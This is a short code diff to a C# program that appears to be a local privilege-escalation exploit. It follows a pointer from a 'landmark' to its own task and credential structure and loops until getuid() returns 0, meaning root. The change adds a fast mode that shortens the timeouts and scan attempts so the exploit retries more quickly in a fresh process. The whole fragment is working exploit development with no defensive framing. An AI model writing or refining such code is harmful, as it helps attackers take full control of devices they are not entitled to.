@@ -504,7 +504,11 @@ internal static class Program
                 Thread.Sleep(700);        // let the child set its tag
 
                 var names = new StringBuilder();
-                var deadline = DateTime.UtcNow.AddSeconds(20);
+                // Waiting longer cannot help when the list is unreadable: the walk either sees
+                // the new landmark within a second or not at all. Fast mode therefore gives
+                // up quickly and lets AUL relaunch a fresh process (fresh mmap) instead of
+                // burning 20 s per round. The long fallback keeps the patient budget.
+                var deadline = DateTime.UtcNow.AddSeconds(fastMode ? 3 : 20);
                 while (DateTime.UtcNow < deadline)
                 {
                     child = 0; self = 0;
@@ -574,7 +578,8 @@ internal static class Program
                 }
 
                 // Parent pointer from the landmark -> our task -> our cred.
-                for (int t = 0; t < 20 && getuid() != 0; t++)
+                int scanTries = fastMode ? 5 : 20;
+            for (int t = 0; t < scanTries && getuid() != 0; t++)
                 {
                     uint parent = 0;
                     try
